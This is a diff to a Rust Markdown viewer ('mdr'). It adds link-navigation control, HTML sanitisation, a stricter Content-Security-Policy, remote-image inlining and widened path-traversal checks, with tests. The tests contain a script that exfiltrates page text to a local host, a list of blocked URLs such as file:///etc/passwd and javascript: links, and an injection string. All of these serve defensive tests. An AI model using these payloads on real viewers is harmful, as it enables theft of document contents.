@@ -1,17 +1,24 @@
 use muda::{Menu, PredefinedMenuItem, Submenu};
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
+use std::sync::{Arc, Mutex};
 use tao::event::{Event, WindowEvent};
 use tao::event_loop::{ControlFlow, EventLoop, EventLoopBuilder};
 use tao::window::WindowBuilder;
 use wry::WebViewBuilder;
 
 use crate::core::markdown::{parse_markdown, GITHUB_CSS};
+use crate::core::sanitize::sanitize_document_html;
 use crate::core::toc;
 use crate::vlog;
 
 /// Events the page can send back to the native event loop.
 enum UserEvent {
     Quit,
+    /// Scroll to a heading: `#anchor` links are handled natively instead of
+    /// letting the window navigate (#55).
+    ScrollToAnchor(String),
+    /// Load another local Markdown document in this window (#55).
+    OpenDocument(PathBuf),
 }
 
 pub fn run(file_path: PathBuf) -> Result<(), Box<dyn std::error::Error>> {
@@ -61,6 +68,12 @@ pub fn run(file_path: PathBuf) -> Result<(), Box<dyn std::error::Error>> {
 
     let event_loop: EventLoop<UserEvent> = EventLoopBuilder::with_user_event().build();
     let quit_proxy = event_loop.create_proxy();
+    let nav_proxy = event_loop.create_proxy();
+
+    // The document currently on screen, shared with the navigation handler so
+    // relative links keep resolving after another file has been opened.
+    let current_doc = Arc::new(Mutex::new(canonical_file.clone()));
+    let nav_doc = Arc::clone(&current_doc);
 
     // Create a native Edit menu so that Cmd+C/Ctrl+C/V/X/A work on all platforms
     let menu = Menu::new();
@@ -100,6 +113,35 @@ pub fn run(file_path: PathBuf) -> Result<(), Box<dyn std::error::Error>> {
         }
     };
 
+    // Nothing but mdr's own document may ever be loaded in this window: a link
+    // used to replace the document with no way back (#55), and a hostile
+    // document could navigate to an attacker-controlled page (#62).
+    let navigation_handler = move |url: String| {
+        let doc = nav_doc
+            .lock()
+            .map(|d| d.clone())
+            .unwrap_or_else(|_| PathBuf::new());
+        match navigation_decision(&url, &doc) {
+            NavDecision::Allow => true,
+            NavDecision::Anchor(anchor) => {
+                let _ = nav_proxy.send_event(UserEvent::ScrollToAnchor(anchor));
+                false
+            }
+            NavDecision::OpenExternally(target) => {
+                open_in_system_browser(&target);
+                false
+            }
+            NavDecision::OpenDocument(path) => {
+                let _ = nav_proxy.send_event(UserEvent::OpenDocument(path));
+                false
+            }
+            NavDecision::Block => {
+                vlog!("navigation refused: {}", url);
+                false
+            }
+        }
+    };
+
     #[cfg(target_os = "linux")]
     let webview = {
         use tao::platform::unix::WindowExtUnix;
@@ -110,6 +152,7 @@ pub fn run(file_path: PathBuf) -> Result<(), Box<dyn std::error::Error>> {
             .with_clipboard(true)
             .with_devtools(true)
             .with_ipc_handler(ipc_handler)
+            .with_navigation_handler(navigation_handler)
             .build_gtk(vbox)?
     };
     #[cfg(not(target_os = "linux"))]
@@ -118,7 +161,12 @@ pub fn run(file_path: PathBuf) -> Result<(), Box<dyn std::error::Error>> {
         .with_clipboard(true)
         .with_devtools(true)
         .with_ipc_handler(ipc_handler)
+        .with_navigation_handler(navigation_handler)
         .build(&window)?;
+
+    let mut watcher_rx = watcher_rx;
+    let mut watched_file = file_path.clone();
+    let mut base_dir = base_dir;
 
     event_loop.run(move |event, _, control_flow| {
         *control_flow = ControlFlow::Wait;
@@ -126,19 +174,8 @@ pub fn run(file_path: PathBuf) -> Result<(), Box<dyn std::error::Error>> {
         // Check for file changes
         if watcher_rx.try_recv().is_ok() {
             while watcher_rx.try_recv().is_ok() {}
-            if let Ok(content) = std::fs::read_to_string(&file_path) {
-                let new_html = parse_markdown(&content);
-                let new_html = resolve_local_images(&new_html, &base_dir);
-                let new_toc = toc::extract_toc(&content);
-                let toc_html = build_toc_html(&new_toc);
-
-                let body_json = serde_json::to_string(&new_html).unwrap_or_default();
-                let toc_json = serde_json::to_string(&toc_html).unwrap_or_default();
-                let js = format!(
-                    "document.querySelector('.content').innerHTML = {}; document.querySelector('.sidebar ul').innerHTML = {}; if (window.hljs) hljs.highlightAll();",
-                    body_json, toc_json
-                );
-                let _ = webview.evaluate_script(&js);
+            if let Ok(content) = std::fs::read_to_string(&watched_file) {
+                let _ = webview.evaluate_script(&document_swap_script(&content, &base_dir));
             }
         }
 
@@ -148,9 +185,62 @@ pub fn run(file_path: PathBuf) -> Result<(), Box<dyn std::error::Error>> {
                 ..
             } => *control_flow = ControlFlow::Exit,
             Event::UserEvent(UserEvent::Quit) => *control_flow = ControlFlow::Exit,
+            Event::UserEvent(UserEvent::ScrollToAnchor(anchor)) => {
+                let _ = webview.evaluate_script(&scroll_to_anchor_script(&anchor));
+            }
+            Event::UserEvent(UserEvent::OpenDocument(path)) => {
+                // Reuse the live-reload machinery: the page stays the same, only
+                // its content and table of contents are replaced.
+                let Ok(content) = std::fs::read_to_string(&path) else {
+                    vlog!("cannot open linked document: {}", path.display());
+                    return;
+                };
+                let new_base = path
+                    .parent()
+                    .map(|p| p.to_path_buf())
+                    .unwrap_or_else(|| base_dir.clone());
+                // Unlike a live reload, opening another document starts at the
+                // top of the page.
+                let js = format!(
+                    "{} window.scrollTo(0, 0);",
+                    document_swap_script(&content, &new_base)
+                );
+                let _ = webview.evaluate_script(&js);
+
+                base_dir = new_base;
+                watched_file = path.clone();
+                if let Ok(rx) = crate::core::watcher::watch_file(&path) {
+                    watcher_rx = rx;
+                }
+                if let Ok(mut doc) = current_doc.lock() {
+                    *doc = path.clone();
+                }
+                window.set_title(&format!("mdr - {}", path.display()));
+            }
             _ => {}
         }
     });
+}
+
+/// The script that swaps the document shown by the page, used both by live
+/// reload and by following a link to another Markdown file.
+fn document_swap_script(markdown: &str, base_dir: &Path) -> String {
+    let body = sanitize_document_html(&resolve_local_images(&parse_markdown(markdown), base_dir));
+    let toc_html = build_toc_html(&toc::extract_toc(markdown));
+    format!(
+        "document.querySelector('.content').innerHTML = {}; document.querySelector('.sidebar ul').innerHTML = {}; if (window.hljs) hljs.highlightAll();",
+        serde_json::to_string(&body).unwrap_or_default(),
+        serde_json::to_string(&toc_html).unwrap_or_default(),
+    )
+}
+
+/// The script that scrolls to a heading, for `#anchor` links the navigation
+/// handler refused to turn into a real navigation.
+fn scroll_to_anchor_script(anchor: &str) -> String {
+    let id = serde_json::to_string(anchor).unwrap_or_else(|_| "\"\"".to_string());
+    format!(
+        "(function() {{ var el = document.getElementById({id}); if (el) el.scrollIntoView({{ behavior: 'smooth', block: 'start' }}); }})();"
+    )
 }
 
 /// Resolve local image paths to inline base64 data URIs.
@@ -169,13 +259,27 @@ fn resolve_local_images(html: &str, base_dir: &std::path::Path) -> String {
         let full_tag = &caps[0];
         let src = &caps[1];
         vlog!("  IMG src={:?}", src);
-        // Skip URLs and existing data URIs
-        if src.starts_with("http://")
-            || src.starts_with("https://")
-            || src.starts_with("data:")
-            || src.starts_with("file://")
-        {
-            vlog!("    → skipped (remote/data URL)");
+        // Remote images: the CSP only allows `img-src data:`, so they are
+        // downloaded and inlined like local ones (#60). When the download
+        // fails — offline mode, network error, non-image answer — the URL is
+        // left alone and the browser simply shows a broken image.
+        if crate::core::net::is_remote_url(src) {
+            return match crate::core::net::remote_image_data_uri(&unescape_url_entities(src)) {
+                Some(data_uri) => {
+                    vlog!("    → remote image inlined ({} bytes)", data_uri.len());
+                    re_src
+                        .replace(full_tag, format!("src=\"{}\"", data_uri).as_str())
+                        .to_string()
+                }
+                None => {
+                    vlog!("    → remote image left as-is");
+                    full_tag.to_string()
+                }
+            };
+        }
+        // Skip what is already inlined, and file:// URLs mdr does not resolve.
+        if src.starts_with("data:") || src.starts_with("file://") {
+            vlog!("    → skipped (data/file URL)");
             return full_tag.to_string();
         }
         // URL-decode the src path (comrak may percent-encode spaces etc.)
@@ -184,18 +288,16 @@ fn resolve_local_images(html: &str, base_dir: &std::path::Path) -> String {
         let abs_path = base_dir.join(&decoded_src);
         vlog!("    abs_path={}", abs_path.display());
         vlog!("    exists={}", abs_path.exists());
-        // Path traversal protection: ensure resolved path is within base_dir
-        if let (Ok(canonical), Ok(canonical_base)) =
-            (abs_path.canonicalize(), base_dir.canonicalize())
-        {
-            if !canonical.starts_with(&canonical_base) {
-                vlog!(
-                    "    → BLOCKED (path traversal: {} escapes {})",
-                    canonical.display(),
-                    canonical_base.display()
-                );
-                return full_tag.to_string();
-            }
+        // Path traversal protection. The allowed root is the enclosing project,
+        // not the directory of the Markdown file, so `docs/page.md` can show
+        // `../images/logo.png` (#61) while `../../../etc/passwd` stays out.
+        if abs_path.exists() && !crate::core::paths::is_within_image_root(&abs_path, base_dir) {
+            vlog!(
+                "    → BLOCKED (path traversal: {} escapes the project of {})",
+                abs_path.display(),
+                base_dir.display()
+            );
+            return full_tag.to_string();
         }
         if abs_path.exists() {
             if let Err(e) = crate::core::image_validation::validate_image_file(&abs_path) {
@@ -257,6 +359,16 @@ fn resolve_local_images(html: &str, base_dir: &std::path::Path) -> String {
         full_tag.to_string()
     })
     .to_string()
+}
+
+/// Undo the HTML escaping comrak applies inside attribute values, so the URL
+/// handed to the fetcher is the one the author wrote. Only the characters
+/// comrak actually escapes are handled: an image URL with a query string
+/// (`?a=1&b=2`) reaches the HTML as `&amp;` and would otherwise 404.
+fn unescape_url_entities(src: &str) -> String {
+    src.replace("&amp;", "&")
+        .replace("&quot;", "\"")
+        .replace("&#39;", "'")
 }
 
 /// Decode percent-encoded URL path components (e.g. %20 -> space).
@@ -396,13 +508,12 @@ fn rasterize_svg_to_png_data_uri(
 
     // Reject files that aren't actually SVG (e.g. HTML pages saved with .svg extension)
     let trimmed = svg_data.trim_start();
-    if !trimmed.starts_with('<')
+    if (!trimmed.starts_with('<')
         || trimmed.starts_with("<!DOCTYPE html")
-        || trimmed.starts_with("<html")
+        || trimmed.starts_with("<html"))
+        && !trimmed.contains("<svg")
     {
-        if !trimmed.contains("<svg") {
-            return Err("File is not a valid SVG (possibly an HTML page)".into());
-        }
+        return Err("File is not a valid SVG (possibly an HTML page)".into());
     }
 
     // Max pixel dimension to avoid memory issues
@@ -416,8 +527,10 @@ fn rasterize_svg_to_png_data_uri(
         Arc::new(db)
     });
 
-    let mut options = usvg::Options::default();
-    options.fontdb = Arc::clone(fontdb);
+    let options = usvg::Options {
+        fontdb: Arc::clone(fontdb),
+        ..Default::default()
+    };
     let tree = usvg::Tree::from_str(&svg_data, &options)?;
     let size = tree.size();
     let svg_w = size.width();
@@ -450,6 +563,10 @@ fn rasterize_svg_to_png_data_uri(
 }
 
 fn build_html(body: &str, toc_entries: &[toc::TocEntry]) -> String {
+    // Everything coming from the document is filtered here, before mdr's own
+    // template is wrapped around it (#62). mdr's scripts are added afterwards
+    // and are never sanitised.
+    let body = &sanitize_document_html(body);
     let toc_html = build_toc_html(toc_entries);
     // Only include mermaid.js if there are fallback blocks that need JS rendering
     let mermaid_script = if body.contains(r#"class="mermaid""#) {
@@ -485,12 +602,24 @@ fn build_html(body: &str, toc_entries: &[toc::TocEntry]) -> String {
         }
     );
 
+    // The CSP below is a second line of defence behind `sanitize_document_html`:
+    // no network access at all (`default-src`/`connect-src 'none'`), no plugin
+    // or frame, no form submission, no `<base>` rewriting; images may only be
+    // the `data:` URIs mdr inlines itself.
+    //
+    // `script-src` still needs `'unsafe-inline'`: every script of the page
+    // (search, keyboard, highlight.js, Mermaid) is inline, so dropping it would
+    // disable mdr itself. Replacing it with a per-page nonce is the real fix and
+    // is possible, but it also disables `'unsafe-inline'` for good, and neither
+    // Mermaid's nor highlight.js's runtime requirements could be checked in a
+    // real WebKit window here — so the document sanitiser stays the guard that
+    // keeps document scripts out of the page.
     format!(
         r#"<!DOCTYPE html>
 <html>
 <head>
 <meta charset="utf-8">
-<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:;">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:; media-src 'none'; object-src 'none'; frame-src 'none'; child-src 'none'; connect-src 'none'; form-action 'none'; base-uri 'none';">
 <style>{css}</style>
 <style>
 .expandable {{ position: relative; }}
@@ -740,6 +869,134 @@ document.querySelector('.sidebar').addEventListener('click', function(e) {{
     )
 }
 
+// --- Navigation -----------------------------------------------------------
+
+/// What the window should do when the page asks to navigate to a URL.
+#[derive(Debug, PartialEq, Eq)]
+enum NavDecision {
+    /// The document mdr injected itself: let it load.
+    Allow,
+    /// A same-page `#anchor`: scroll, do not navigate.
+    Anchor(String),
+    /// Hand the URL to the system browser and keep the document on screen.
+    OpenExternally(String),
+    /// Another local Markdown file: load it in this window.
+    OpenDocument(PathBuf),
+    /// Anything else — refused, so the document can never be replaced by a
+    /// remote page the user cannot navigate back from.
+    Block,
+}
+
+/// URLs that identify the page mdr loaded itself.
+///
+/// `with_html()` hands the HTML straight to the engine, which reports the
+/// document as `about:blank` on every platform wry supports (`loadHTMLString`
+/// with a nil base URL on macOS, `load_html` on WebKitGTK, `NavigateToString`
+/// on WebView2).
+fn is_mdr_document_url(url: &str) -> bool {
+    let lower = url.trim().to_ascii_lowercase();
+    lower.is_empty() || lower == "about:blank" || lower == "about:srcdoc" || lower == "about:"
+}
+
+fn has_scheme(url: &str) -> bool {
+    match url.find(':') {
+        None => false,
+        Some(idx) => {
+            let scheme = &url[..idx];
+            !scheme.is_empty()
+                && scheme.starts_with(|c: char| c.is_ascii_alphabetic())
+                && scheme
+                    .chars()
+                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'))
+                // `foo/bar:baz` is a relative path, not a scheme.
+                && !url[..idx].contains(['/', '?', '#'])
+        }
+    }
+}
+
+fn is_markdown_path(path: &Path) -> bool {
+    path.extension()
+        .and_then(|e| e.to_str())
+        .map(|e| e.eq_ignore_ascii_case("md") || e.eq_ignore_ascii_case("markdown"))
+        .unwrap_or(false)
+}
+
+/// Decide what to do with a navigation request, given the document on screen.
+///
+/// Pure on purpose: the effects (spawning a browser, swapping the document)
+/// live in the caller so this can be tested without a window.
+fn navigation_decision(url: &str, current_doc: &Path) -> NavDecision {
+    let url = url.trim();
+
+    // `#anchor`, possibly already resolved against the `about:blank` base URL.
+    if let Some((base, fragment)) = url.split_once('#') {
+        if !fragment.is_empty() && is_mdr_document_url(base) {
+            return NavDecision::Anchor(fragment.to_string());
+        }
+    }
+    if is_mdr_document_url(url) {
+        return NavDecision::Allow;
+    }
+
+    let lower = url.to_ascii_lowercase();
+
+    if lower.starts_with("http://") || lower.starts_with("https://") || lower.starts_with("mailto:")
+    {
+        return NavDecision::OpenExternally(url.to_string());
+    }
+
+    if lower.starts_with("file://") {
+        let rest = &url["file://".len()..];
+        // `file://localhost/x` is the same as `file:///x`.
+        let rest = rest.strip_prefix("localhost").unwrap_or(rest);
+        let path = PathBuf::from(percent_decode(
+            rest.split(['?', '#']).next().unwrap_or(rest),
+        ));
+        return if is_markdown_path(&path) {
+            NavDecision::OpenDocument(path)
+        } else {
+            NavDecision::Block
+        };
+    }
+
+    // A relative link, if the engine hands one over unresolved.
+    if !has_scheme(url) && !url.is_empty() {
+        let target = percent_decode(url.split(['?', '#']).next().unwrap_or(url));
+        let path = current_doc.parent().unwrap_or(Path::new(".")).join(&target);
+        if is_markdown_path(&path) {
+            return NavDecision::OpenDocument(path);
+        }
+    }
+
+    NavDecision::Block
+}
+
+/// Open a URL with the system browser.
+///
+/// No crate is pulled in for this: the platform opener is spawned directly.
+/// `Command` passes the URL as a single argument without a shell, so nothing in
+/// it can be interpreted — with the caveat that on Windows the URL travels
+/// through `cmd.exe`, whose own quoting rules are looser; only `http(s)` and
+/// `mailto` URLs, which [`navigation_decision`] alone produces, get here.
+fn open_in_system_browser(url: &str) {
+    use std::process::Command;
+
+    vlog!("opening in the system browser: {}", url);
+    let spawned = if cfg!(target_os = "macos") {
+        Command::new("open").arg(url).spawn()
+    } else if cfg!(target_os = "windows") {
+        Command::new("cmd")
+            .args(["/c", "start", ""])
+            .arg(url)
+            .spawn()
+    } else {
+        Command::new("xdg-open").arg(url).spawn()
+    };
+    if let Err(e) = spawned {
+        vlog!("could not open {}: {}", url, e);
+    }
+}
+
 // --- Keyboard shortcuts ---------------------------------------------------
 
 /// IPC message the page sends when the user asks to close the window.
@@ -955,8 +1212,11 @@ const KEYBOARD_JS: &str = r#"
 
     function el(id) { return document.getElementById(id); }
     function isVisible(node) { return node && node.style.display !== 'none' && node.style.display !== ''; }
-    function scrollHeight() {
-        return (document.scrollingElement || document.documentElement).scrollHeight;
+    // `.content` lays out with `overflow: visible`, so the page scrolls as a
+    // whole: `document.scrollingElement` is the node that moves, and `window`
+    // is the API that moves it.
+    function scroller() {
+        return document.scrollingElement || document.documentElement;
     }
     function systemTheme() {
         return (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? 'dark' : 'light';
@@ -989,7 +1249,7 @@ const KEYBOARD_JS: &str = r#"
         pageDown: function() { window.scrollBy(0, window.innerHeight * 0.9); },
         pageUp: function() { window.scrollBy(0, -window.innerHeight * 0.9); },
         goTop: function() { window.scrollTo(0, 0); },
-        goBottom: function() { window.scrollTo(0, scrollHeight()); },
+        goBottom: function() { window.scrollTo(0, scroller().scrollHeight); },
         zoomIn: function() { if (zoomIdx < ZOOM_STEPS.length - 1) { zoomIdx++; applyZoom(); } },
         zoomOut: function() { if (zoomIdx > 0) { zoomIdx--; applyZoom(); } },
         zoomReset: function() { zoomIdx = DEFAULT_ZOOM; applyZoom(); },
@@ -1410,11 +1670,50 @@ mod tests {
     }
 
     #[test]
-    fn resolve_local_images_preserves_remote_urls() {
+    fn resolve_local_images_preserves_remote_urls_when_they_cannot_be_fetched() {
+        // Remote images are now inlined when they can be downloaded (#60), so
+        // the guarantee this test protects is the fallback: when the download
+        // does not happen, the tag must come out untouched rather than broken.
+        // Offline mode plus a `.invalid` host (RFC 2606: never resolvable) make
+        // sure no request leaves the machine, whatever the global offline flag
+        // does in parallel tests.
         let dir = std::env::temp_dir();
-        let html = r#"<img src="https://example.com/image.svg" alt="remote">"#;
+        let html = r#"<img src="https://example.invalid/image.svg" alt="remote">"#;
+
+        crate::core::set_offline(true);
         let result = resolve_local_images(html, &dir);
-        assert_eq!(result, html, "Remote URLs should be preserved unchanged");
+        crate::core::set_offline(false);
+
+        assert_eq!(
+            result, html,
+            "An unreachable remote URL must be preserved unchanged"
+        );
+    }
+
+    #[test]
+    fn a_remote_url_is_unescaped_before_being_fetched() {
+        assert_eq!(
+            unescape_url_entities("https://img.shields.io/b.svg?a=1&amp;b=2"),
+            "https://img.shields.io/b.svg?a=1&b=2"
+        );
+        assert_eq!(
+            unescape_url_entities("https://example.com/a.png"),
+            "https://example.com/a.png"
+        );
+    }
+
+    #[test]
+    fn remote_images_are_recognised_as_fetchable() {
+        // The substitution path itself needs the network, so what is tested
+        // here is the branch selection: an http(s) src goes to the fetcher
+        // (which declines while offline) and never to the local-file resolver.
+        assert!(crate::core::net::is_remote_url(
+            "https://example.invalid/a.png"
+        ));
+        crate::core::set_offline(true);
+        let inlined = crate::core::net::remote_image_data_uri("https://example.invalid/a.png");
+        crate::core::set_offline(false);
+        assert_eq!(inlined, None, "offline mode must not download anything");
     }
 
     #[test]
@@ -1556,6 +1855,59 @@ mod tests {
 
         let result = rasterize_svg_to_png_data_uri(&path).unwrap();
         assert!(result.starts_with("data:image/png;base64,"));
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn resolve_local_images_allows_a_parent_directory_inside_the_project() {
+        // `docs/page.md` referencing `../images/logo.png` is the layout #61 is
+        // about: legitimate, and previously blocked.
+        let dir = std::env::temp_dir().join("mdr_test_webview_project_images");
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(dir.join(".git")).unwrap();
+        std::fs::create_dir_all(dir.join("docs")).unwrap();
+        std::fs::create_dir_all(dir.join("images")).unwrap();
+
+        let mut img = image::RgbaImage::new(1, 1);
+        img.put_pixel(0, 0, image::Rgba([1, 2, 3, 255]));
+        img.save(dir.join("images/logo.png")).unwrap();
+
+        let html = r#"<img src="../images/logo.png" alt="logo">"#;
+        let result = resolve_local_images(html, &dir.join("docs"));
+
+        assert!(
+            result.contains("data:image/png;base64,"),
+            "An image of the enclosing project must be inlined, got: {}",
+            &result[..result.len().min(200)]
+        );
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn resolve_local_images_blocks_traversal_out_of_the_project() {
+        // Same widening as above, but the target sits outside the project: the
+        // guard must still refuse it.
+        let dir = std::env::temp_dir().join("mdr_test_webview_project_escape");
+        let _ = std::fs::remove_dir_all(&dir);
+        let proj = dir.join("proj");
+        std::fs::create_dir_all(proj.join(".git")).unwrap();
+        std::fs::create_dir_all(proj.join("docs")).unwrap();
+
+        let mut img = image::RgbaImage::new(1, 1);
+        img.put_pixel(0, 0, image::Rgba([255, 0, 0, 255]));
+        img.save(dir.join("secret.png")).unwrap();
+
+        let html = r#"<img src="../../secret.png" alt="secret">"#;
+        let result = resolve_local_images(html, &proj.join("docs"));
+
+        assert!(
+            !result.contains("data:image/png;base64,"),
+            "Escaping the project must stay blocked, got: {}",
+            &result[..result.len().min(200)]
+        );
+        assert!(result.contains(r#"src="../../secret.png""#), "{}", result);
 
         let _ = std::fs::remove_dir_all(&dir);
     }
@@ -1806,6 +2158,186 @@ mod tests {
         assert!(is_quit_request(IPC_QUIT));
     }
 
+    // --- document sanitisation (#62) ---
+
+    #[test]
+    fn the_exfiltration_payload_does_not_survive_the_pipeline() {
+        // The exact document from the report: a raw <script> in the Markdown
+        // that navigates the window to an attacker-controlled host.
+        let markdown = concat!(
+            "# Notes\n\n",
+            "<script>location.href=\"http://127.0.0.1:8765/exfil?d=\"",
+            "+encodeURIComponent(document.body.innerText.slice(0,40));</script>\n",
+        );
+        let body = sanitize_document_html(&parse_markdown(markdown));
+        let page = build_html(&body, &[]);
+
+        assert!(!body.contains("127.0.0.1:8765"), "{body}");
+        assert!(!body.contains("location.href"), "{body}");
+        assert!(!page.contains("127.0.0.1:8765"), "payload reached the page");
+        assert!(!page.contains("encodeURIComponent(document.body"), "{page}");
+        assert!(
+            page.contains("Notes"),
+            "the document itself must still render"
+        );
+    }
+
+    #[test]
+    fn build_html_sanitises_the_body_on_its_own() {
+        // Even a caller that forgets to sanitise cannot inject a script.
+        let page = build_html(r#"<p>hi</p><script>alert(1)</script>"#, &[]);
+        assert!(!page.contains("alert(1)"), "{page}");
+        assert!(page.contains("<p>hi</p>"));
+    }
+
+    #[test]
+    fn build_html_keeps_the_scripts_of_mdr_itself() {
+        // The sanitiser runs on the document only: mdr's own inline scripts
+        // must be untouched, or the page loses search, shortcuts and zoom.
+        let page = build_html("<p>hi</p><pre><code>x</code></pre>", &[]);
+        assert!(page.contains("window.mdrActions"), "keyboard layer missing");
+        assert!(page.contains("window.searchNav"), "search layer missing");
+        assert!(
+            page.contains("hljs.highlightAll();"),
+            "highlighting missing"
+        );
+        assert!(page.contains("expand-overlay"), "image zoom missing");
+    }
+
+    #[test]
+    fn build_html_hardens_the_csp() {
+        let page = build_html("<p>hi</p>", &[]);
+        for directive in [
+            "default-src 'none'",
+            "object-src 'none'",
+            "frame-src 'none'",
+            "form-action 'none'",
+            "base-uri 'none'",
+            "connect-src 'none'",
+            // Local images are inlined, so this one has to stay.
+            "img-src data:",
+        ] {
+            assert!(page.contains(directive), "CSP misses {directive}: {page}");
+        }
+    }
+
+    #[test]
+    fn a_mermaid_diagram_still_reaches_the_page() {
+        let md = "```mermaid\ngraph LR\n  A-->B\n```";
+        let page = build_html(&parse_markdown(md), &[]);
+        assert!(
+            page.contains("mermaid-diagram")
+                || page.contains("mermaid-error")
+                || page.contains("mermaid-fallback")
+                || page.contains(r#"class="mermaid""#),
+            "sanitisation must not eat the Mermaid output"
+        );
+    }
+
+    #[test]
+    fn the_live_reload_script_carries_sanitised_html() {
+        let dir = std::env::temp_dir();
+        let js = document_swap_script("<script>alert(1)</script>\n\n# Title\n", &dir);
+        assert!(!js.contains("alert(1)"), "{js}");
+        assert!(js.contains("Title"), "{js}");
+        assert!(js.contains(".content"), "{js}");
+    }
+
+    #[test]
+    fn the_anchor_script_escapes_its_argument() {
+        // The anchor comes from the document, so it has to be escaped, not
+        // concatenated: the quote must come out backslashed.
+        let js = scroll_to_anchor_script("a\");alert(1);//");
+        assert!(js.contains(r#"getElementById("a\");alert(1);//")"#), "{js}");
+    }
+
+    // --- navigation (#55) ---
+
+    #[test]
+    fn the_initial_document_is_allowed_to_load() {
+        let doc = Path::new("/docs/page.md");
+        assert_eq!(navigation_decision("about:blank", doc), NavDecision::Allow);
+        assert_eq!(navigation_decision("", doc), NavDecision::Allow);
+    }
+
+    #[test]
+    fn http_links_go_to_the_system_browser() {
+        let doc = Path::new("/docs/page.md");
+        assert_eq!(
+            navigation_decision("https://example.com/a", doc),
+            NavDecision::OpenExternally("https://example.com/a".to_string())
+        );
+        assert_eq!(
+            navigation_decision("http://example.com/a?b=1#c", doc),
+            NavDecision::OpenExternally("http://example.com/a?b=1#c".to_string())
+        );
+        assert_eq!(
+            navigation_decision("mailto:someone@example.com", doc),
+            NavDecision::OpenExternally("mailto:someone@example.com".to_string())
+        );
+    }
+
+    #[test]
+    fn anchors_scroll_instead_of_navigating() {
+        let doc = Path::new("/docs/page.md");
+        assert_eq!(
+            navigation_decision("#section-1", doc),
+            NavDecision::Anchor("section-1".to_string())
+        );
+        // WebKit resolves the link against the about:blank base URL first.
+        assert_eq!(
+            navigation_decision("about:blank#section-1", doc),
+            NavDecision::Anchor("section-1".to_string())
+        );
+    }
+
+    #[test]
+    fn a_local_markdown_file_is_opened_in_the_window() {
+        let doc = Path::new("/docs/page.md");
+        assert_eq!(
+            navigation_decision("file:///docs/other.md", doc),
+            NavDecision::OpenDocument(PathBuf::from("/docs/other.md"))
+        );
+        assert_eq!(
+            navigation_decision("file:///docs/a%20b.markdown", doc),
+            NavDecision::OpenDocument(PathBuf::from("/docs/a b.markdown"))
+        );
+        // Relative links, should the engine hand one over unresolved.
+        assert_eq!(
+            navigation_decision("other.md", doc),
+            NavDecision::OpenDocument(PathBuf::from("/docs/other.md"))
+        );
+    }
+
+    #[test]
+    fn everything_else_is_refused() {
+        let doc = Path::new("/docs/page.md");
+        for url in [
+            "file:///etc/passwd",
+            "file:///docs/report.pdf",
+            "javascript:alert(1)",
+            "data:text/html,<script>alert(1)</script>",
+            "vbscript:msgbox(1)",
+            "ftp://example.com/x",
+            "chrome://settings",
+        ] {
+            assert_eq!(
+                navigation_decision(url, doc),
+                NavDecision::Block,
+                "{url} must be refused"
+            );
+        }
+    }
+
+    #[test]
+    fn scheme_detection_does_not_trip_on_paths() {
+        assert!(has_scheme("https://example.com"));
+        assert!(has_scheme("javascript:alert(1)"));
+        assert!(!has_scheme("notes/a:b.md"));
+        assert!(!has_scheme("./other.md"));
+        assert!(!has_scheme("other.md"));
+    }
+
     #[test]
     fn unknown_ipc_messages_do_not_close_the_window() {
         // The page renders untrusted Markdown; a stray postMessage must not
@@ -1815,6 +2347,27 @@ mod tests {
                 !is_quit_request(message),
                 "{:?} must not be treated as a quit request",
                 message
+            );
+        }
+    }
+}
+
+#[cfg(test)]
+mod scroll_tests {
+    use super::*;
+
+    /// Every scrolling shortcut must be wired to an action; a binding whose
+    /// action is missing from `mdrActions` fails silently in the page.
+    #[test]
+    fn every_binding_has_an_action_in_the_script() {
+        let js = keyboard_script();
+        for shortcut in SHORTCUTS {
+            assert!(
+                js.contains(&format!("{}:", shortcut.action))
+                    || js.contains(&format!("{}: ", shortcut.action)),
+                "action {} is bound to {:?} but not defined in mdrActions",
+                shortcut.action,
+                shortcut.bindings
             );
         }
     }
